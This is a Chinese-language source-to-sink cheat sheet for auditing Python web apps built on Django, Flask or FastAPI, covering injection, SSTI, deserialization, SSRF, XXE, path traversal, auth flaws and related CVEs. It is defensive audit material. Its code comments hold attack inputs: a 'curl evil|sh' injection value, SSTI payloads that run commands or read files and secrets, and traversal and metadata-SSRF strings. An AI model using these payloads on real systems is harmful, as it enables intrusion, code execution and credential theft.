# Python Sink 速查表（Django/Flask/FastAPI 白盒审计）

> 何时开本表：白盒审 Python 项目已定位路由/入口，要把污点源→危险汇连通路径圈全；只记得漏洞类不记得 API 默认行为时按表反查；半黑盒拿到部分源码时验证某调用可利用性。不适合：纯黑盒无源码、已知依赖 CVE 直接打（直接看「历史 CVE 模式」）。
> 原则：同 API 不同版本默认值不同（yaml.load 的 Loader、PyJWT 的 algorithms 均随版本变），先锁依赖版本再定性。

## 污点源

| 源 | 形态 | 备注 |
|---|---|---|
| Flask `request.args/.form/.values/.json/.get_json()/.data/.files/.headers/.cookies` | 已解析对象 | `get_json(silent=True)` 静默失败返回 None，命中时全量污点；路由 `<param>` 与 `view_args` 同级污点，仅声明 converter 的做类型转换 |
| Django `request.GET/.POST/.body()/.FILES/.COOKIES/.META/.headers` | `POST` 仅表单；JSON 需自行 `json.loads(request.body)` | `META['HTTP_*']` 即请求头（HTTP_X_FORWARDED_FOR），常被误当服务端数据；urls 捕获组传视图入参：`path('<int:id>')` 已转 int，`re_path` 捕获组为 str |
| FastAPI 声明式入参 | Query/Path/Header/Cookie/File/Body 项与 Pydantic 模型字段 | 声明即污点入口，验证≠清洗；`request.body()/.json()/.query_params` 直读绕过 Pydantic 边界 |
| WebSocket 消息 | flask-sock `ws.receive()`；FastAPI `websocket.receive_text/json/bytes`；Channels `receive(text_data/bytes_data)` | 常被当"可信内部通道"漏审 |
| 环境变量透传 | `os.environ` / `os.getenv` | DATABASE_URL、SECRET_KEY、命令模板从 env 来即污点；容器/CI 场景可注入 |

## 危险汇（按漏洞类）

### SQL 注入

| sink | 危险形态 | 安全形态 |
|---|---|---|
| DB-API2（psycopg2/MySQLdb/sqlite3…）execute | `execute("… WHERE id=%s" % v)`、`execute(f"…{v}")`、`executemany` 拼串 | `execute("… WHERE id=%s", (v,))`（sqlite3 用 `?`）；占位符在引号内且值走第二参才是参数化 |
| Django ORM | `extra(where=[f"…{v}"])`、`extra(select=…/order_by=…)` 拼接、`raw(f"SELECT {col} …")`、`connection.cursor().execute(sql % v)` | `raw("… WHERE id=%s", [v])`；ORM 表达式自动参数化 |
| SQLAlchemy | `text(f"… name='{v}'")`、`text("…"+v)`、`query.filter("name='%s'" % v)`、`order_by(text(user))` | `text("… name=:n").bindparams(n=v)`；Core 表达式自动参数化 |

```python
cur.execute("SELECT * FROM users WHERE name = '%s'" % name)            # 注入
User.objects.raw(f"SELECT * FROM app_user WHERE id = {uid}")           # 注入
cur.execute("SELECT * FROM users WHERE name = %s", (name,))            # 参数化
User.objects.raw("SELECT * FROM app_user WHERE id = %s", [uid])        # 参数化
db.session.execute(text("SELECT * FROM t WHERE a = :a"), {"a": a})     # 绑定
```

审计要点：
1. 判定只看一件事：execute/text 首参里有无拼接（`%`/f-string/`+`）；ORM 不免疫——列名/表达式位无法参数化（Django extra()/raw()、SQLAlchemy order_by(text())），是高发区。
2. Django `order_by()/values()` 未知列抛 FieldError，属字段名校验，别误报 SQL 注入；真注入面在 extra()/raw()/explain()/Trunc。
3. `filter(**request.GET)` 属查询注入（见框架特有），危害=逐字符 exfil，与 SQL 注入分开报。

### SSTI

| sink | 场景 |
|---|---|
| `flask.render_template_string(user_str)` | 模板源直接含污点 |
| `jinja2.Environment(...).from_string(user_str)` | 手持 Jinja2 同源 |
| `tornado.template.Template(user_str).generate()` | Tornado；`render_string(模板名)` 需模板名可控指向可写文件 |
| `mako.Template(user_str)` | Mako 允许 `<% %>` 原生 Python，更易直接 RCE |

```python
return render_template_string("Hello " + request.args.get("name"))    # SSTI
# 逃逸链常用起点（确认污点被渲染后用于 PoC，按收益排序）：
#   {{ config }}                                                     → 第一收益：直接读 SECRET_KEY
#   {{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
#   {{ lipsum.__globals__['os'].popen('id').read() }} 或 {{ cycler.__init__.__globals__.os.popen('id').read() }}
#   {{ ''.__class__.__mro__[1].__subclasses__() }}                   → 枚举 subclasses 找 Popen
```

审计要点：
1. 先定模板字符串来源：`render_template(文件名可控)` 是路径问题不是 SSTI，两条链分开报。
2. 收益排序：读 SECRET_KEY（→会话伪造）> 读文件 > RCE；`{{ config }}` 一行即成立。
3. `autoescape=False` 或渲染非 html 模板只是放大 XSS，不改变 SSTI 判定。

### 命令执行

| sink | 备注 |
|---|---|
| `os.system(cmd)` / `os.popen(cmd)` | 永远经 shell 解释 |
| `subprocess.run/call/check_output/Popen(..., shell=True)` | 拼串+shell=True=注入；POSIX 下传列表+shell=True 会被并成单串，同样危险 |
| `eval()` / `exec()` / `compile()` | 污点进任一即代码执行 |
| `input()`（仅 Python 2） | py2 `input()`≡`eval(raw_input())`；py3 返回 str，安全 |

```python
subprocess.run(f"convert {f} out.png", shell=True)   # f="a; curl evil|sh" → 注入
subprocess.run(["convert", f, "out.png"])            # 安全：列表 + 默认 shell=False
eval(request.form.get("expr"))                       # 直接 RCE
```

审计要点：
1. shell=True 且命令串含任何拼接即成立；列表传参时元字符只当字面量；白名单要做在"选命令"级（映射表），不是"过滤参数字符"级。
2. 间接污点高频：命令模板存数据库/配置项，后台功能可写配置=可注入命令。

### 反序列化

| sink | 条件与版本 |
|---|---|
| `pickle.loads` / `cPickle._loads` | 输入可控即 RCE（`__reduce__` 构造 gadgets） |
| `yaml.load` 演变 | **<5.1 默认 `Loader=yaml.Loader`（可构造任意对象）；5.1 起默认 FullLoader 并发弃用告警，但 5.1~5.3.1 的 FullLoader 仍可 RCE（CVE-2020-1747/14343），5.4 修复**；任意版本正解 `yaml.safe_load` / `Loader=yaml.SafeLoader` |
| `marshal.loads` | 非受信输入→解释器层内存破坏（未定义行为）；`jsonpickle.decode`/`dill.loads` 设计上还原对象，等效 RCE |
| `shelve.open` 后读 value | value 底层就是 pickle；dbm 文件内容可控（上传/还原备份场景）即等效 pickle.loads |

```python
pickle.loads(request.get_data())            # RCE：__reduce__ 直调 os.system
yaml.load(text)                             # <5.1 全功能 Loader → RCE
yaml.load(text, Loader=yaml.FullLoader)     # ≤5.3.1 仍可 python/object/new 绕过
shelve.open("cache.db")["k"]                # cache.db 可控即等效 pickle
```

审计要点：
1. 先锁 PyYAML 版本再定性：requirements 里 `pyyaml<5.4` + FullLoader = 可报 RCE；≥5.4 降级处理。
2. 反序列化常藏在缓存/MQ/会话后端（redis 值、Celery 消息体），不只 HTTP body；全量 grep `yaml.load` 逐一核 Loader，safe_load 与 load 混用的项目必漏。

### SSRF

| sink | 默认行为（决定绕过面） |
|---|---|
| `requests.get/post(...)` | 默认 `allow_redirects=True`（HEAD 除外）→ 跳转链绕过主机白名单；不支持 file:// |
| `urllib.request.urlopen(url)` | 支持 `file://`/`ftp://`（gopher 已移除）；默认跟随 30x（目标限 http/https/ftp）→ **file 协议直接读本地文件**；pycurl（若用）另支持 gopher/dict/telnet |
| `aiohttp` / `httpx` | aiohttp 默认跟随重定向；httpx **默认不跟随**（follow_redirects=False），显式打开后跳转校验同查 |
| 校验-连接分离 | urlparse 校验后未固定 IP 再发起请求 → DNS rebinding（TOCTOU） |

```python
requests.get(u)                                        # u 校验过 host，但默认跟随 30x → 跳 169.254.169.254
urllib.request.urlopen(request.json()["url"]).read()   # 支持 file:// → 直接读 /etc/passwd
```

审计要点：
1. 白名单必须同时管首跳、重定向链与协议：requests 传 `allow_redirects=False` 自管每一跳；urllib/pycurl 的 file/ftp/gopher/dict 面单独测。
2. resolve 后固定 IP 再连接、禁二次解析才防 rebinding；优先打收益点：云 metadata、内网 admin、file:// 读配置拿凭据。

### 路径穿越

| sink | 危险形态 |
|---|---|
| `open(os.path.join(base, user))` | user 以 `/` 开头时 join 吞掉 base（`join('/data','/etc/passwd')→'/etc/passwd'`）；`../` 穿越同理；Django `FileResponse(open(污点,'rb'))` 等效 |
| Flask `send_file(user_path)` | 以污点为完整路径；`send_from_directory` 内部 safe_join 拦 `..`，相对安全；`download_name` 只改响应头文件名，不影响实际读取路径 |
| `tarfile.extractall(dest)` | 默认不清洗成员名（CVE-2007-4559），`../` 任意写；3.10.12+/3.12+ 需显式 `filter="data"` |
| `zipfile.ZipFile.extractall` | 3.6.2 起成员名清洗绝对路径与 `..`，基本免疫 zip slip；<3.6.2 或自写循环 `z.open(name)` 落盘则中招 |

```python
p = os.path.join(UPLOAD_DIR, request.args["f"])
return send_file(p)                    # f=../../etc/passwd → join 后穿越
tf.extractall("/opt/app")              # tarfile 默认可 ../ → 任意写
```

审计要点：
1. os.path.join 不是防御：正解 `werkzeug.utils.safe_join`，或 `realpath` 后 `startswith(base + os.sep)` 前缀比对；文件名先入库再使用（二次污点）也算可控。
2. tarfile（默认危险）与 zipfile≥3.6（默认清洗）结论相反，报告别写反。

### XXE

| sink | 默认行为 |
|---|---|
| `lxml.etree.parse/fromstring` | 默认 XMLParser `resolve_entities=True`；`no_network=True` 只断 http(s)——**file:// 外部实体仍展开 → 本地文件读取** |
| `xml.etree.ElementTree` / `xml.dom.minidom` / `xml.sax` | 标准库 expat 默认不拉外部实体（未定义实体直接 ParseError），但 DTD 内部实体膨胀 DoS（billion laughs）在旧 expat(<2.4) 仍成立 |
| `defusedxml.*` | 正解：同 API 防外部实体+膨胀；import 里没有它且用了 lxml → 重点查 |

```python
etree.fromstring(request.get_data())    # lxml 默认展开 file:// 实体 → 读本地文件
# 防御：etree.XMLParser(resolve_entities=False, no_network=True, dtd_loading=False)
```

审计要点：
1. 看 import 定性：入口全走 defusedxml → XXE 降级；lxml 直用才按默认行为查。
2. 自定义 EntityResolver 或 sax `feature_external_ges=True` 会重新打开外部实体；高频入口：XML 上传/导入、SOAP、SAML 响应、RSS 抓取。

### 认证与会话

| 弱位 | 说明 |
|---|---|
| Flask session / itsdangerous Signer | 签名≠加密：cookie 客户端可反解（flask-unsign）；SECRET_KEY 弱/泄露 → 伪造任意会话（含 admin 标志位） |
| SECRET_KEY 硬编码/默认 | `'dev'`/`'changeme'`/模板遗留/None；能起会话就必有密钥，找出它 |
| PyJWT `jwt.decode` | 1.x 不传 algorithms 时按 token 头声明的 alg 验签 → 密钥混淆/老版 none 可乘；≥2.0 强制传参，缺省抛错 |
| RS256↔HS256 密钥混淆 | 用 RSA 公钥当 HMAC 密钥验签（alg 由攻击者声明）→ 伪造 token |
| python-jose `jose.jwt.decode` | ≤3.3.0：ECDSA 签名可锻造（CVE-2024-33663）+ JWT 解压炸弹（CVE-2024-33664） |

```python
jwt.decode(tok, pub_key, algorithms=["HS256"])   # 混淆：RSA 公钥当 HMAC 密钥
jwt.decode(tok, key)                             # PyJWT 1.x：未锁算法
jwt.decode(tok, key, algorithms=["HS256"])       # 正确
```

审计要点：
1. 三连问：密钥来源强度、algorithms 是否白名单化、验签失败是否短路返回。
2. Flask session 是"签名不加密"：存 role/user_id 且无服务端会话 → 密钥强度=认证强度；版本定性 PyJWT<1.5.2 / python-jose≤3.3.0 按 CVE 表直接报。

## 框架特有

### Django

| 陷阱 | 查找特征 |
|---|---|
| `DEBUG=True` 上线 | settings.py / env 注入；错误页泄露调用栈、SQL、全部配置项 |
| `ALLOWED_HOSTS=['*']`（或 []+DEBUG）且取 IP 用 `request.META['HTTP_X_FORWARDED_FOR']` | XFF 是请求头不是事实 → 伪造来源 IP 绕频控/审计/封禁白名单 |
| CSRF 豁免 | `@csrf_exempt`、MIDDLEWARE 缺 `CsrfViewMiddleware`、`check_csrf=False` |
| ORM 查询注入 via kwargs | `filter(**request.GET.dict())` / `Q(**params)`：`password__startswith='a'` 逐字符 exfil（dlint 覆盖的反模式） |
| Mass assignment | ModelForm `fields='__all__'`、`Model(**request.data)` 覆写 `is_staff`/`user_id` 等敏感字段 |

### Flask

| 陷阱 | 查找特征 |
|---|---|
| SECRET_KEY 弱 | 硬编码/`'dev'`/模板默认；flask-unsign 字典爆破可复证 |
| `app.run(debug=True)` 暴露 | Werkzeug 调试器+PIN=交互式 RCE；PIN 无速率限制可离线爆破、`WERKZEUG_DEBUG_PIN=0` 直接关掉 |
| session cookie 反解 | 客户端可见：存敏感字段即泄漏；SESSION_COOKIE_SECURE/HTTPONLY/SAMESITE 缺失另计 |

### FastAPI

| 陷阱 | 查找特征 |
|---|---|
| Pydantic 验证边界 | 只有声明成参数/模型的入口被验证；`request.body()/query_params` 直读=裸奔；不设 response_model 时 ORM 对象整体序列化 → hash/密码/内部字段泄漏 |
| 依赖注入鉴权遗漏 | app 级 dependencies 不覆盖 `app.mount()` 子应用；单独 APIRouter 忘挂 `Depends(auth)` → 整组接口裸奔，逐 router 核对 |
| 文档路由暴露 | 默认 `/docs`、`/redoc`、`/openapi.json` 暴露全量接口+参数结构；生产应 `docs_url=None` 或挂鉴权 |

## 历史 CVE 模式

| CVE | 根因 | 查找特征 |
|---|---|---|
| CVE-2020-14343（前序 CVE-2020-1747） | PyYAML ≤5.3.1 FullLoader `python/object/new` 绕过构造限制 → RCE | `yaml.load(…, FullLoader)` 且 pyyaml<5.4 |
| CVE-2024-33663 / CVE-2024-33664 | python-jose ≤3.3.0 ECDSA 未校验 S 可锻造签名 / JWT 解压炸弹 DoS | `jose.jwt.decode` + python-jose<=3.3.0 |
| CVE-2017-11424 | PyJWT <1.5.2 验签算法未强制，RSA 公钥可作 HMAC 密钥（密钥混淆） | `jwt.decode` 公钥+HS256，或未传 algorithms |
| CVE-2022-34265（同族 CVE-2022-34263） | Django `Trunc()/Extract()` 的 tzinfo 直接拼 SQL | `Extract(`/`Trunc(` 收用户时区 + Django<4.0.6/3.2.20 |
| CVE-2024-49766（3.0.6）/ CVE-2024-34069（3.0.3） | Werkzeug 调试器 PIN 爆破/特定配置绕过 → /console 交互式 RCE | `app.run(debug=True)` 或 `run_simple(use_debugger=True)` 外网可达 |

## 自动化辅助

1. `bandit -r app/`：B602/B605/B607（subprocess shell、os.system）、B307 eval/exec、B301 pickle、B506 yaml.load、B310 urlopen、B608 SQL 拼接、B105/B106 硬编码密钥、B703 Django mark_safe。盲区：跨文件污点、ORM 列名位注入、经 redis/MQ 中转的反序列化。
2. `dlint`（Django 反模式专项）：filter(**kwargs)、extra()、raw() 的框架层误用。盲区：只认 Django，Flask/FastAPI 全不适配。
3. `semgrep --config p/python --config p/flask --config p/django`：覆盖 render_template_string、shell=True、extra()/raw() 拼接、debug=True。盲区：值流跨函数后误报/漏报各半，Pydantic 边界绕过、依赖注入鉴权遗漏等语义位不识别。
4. `pip-audit -r requirements.txt`：按锁定版本给 PyYAML/python-jose/Werkzeug/PyJWT/Django 出 CVE 定性，补上源码扫描对"版本型漏洞"的空白。
5. 共同盲区：越权/业务逻辑（自动化=0）、env 配置注入、间接污点（DB/缓存中转）——必须人工按上表逐类过。
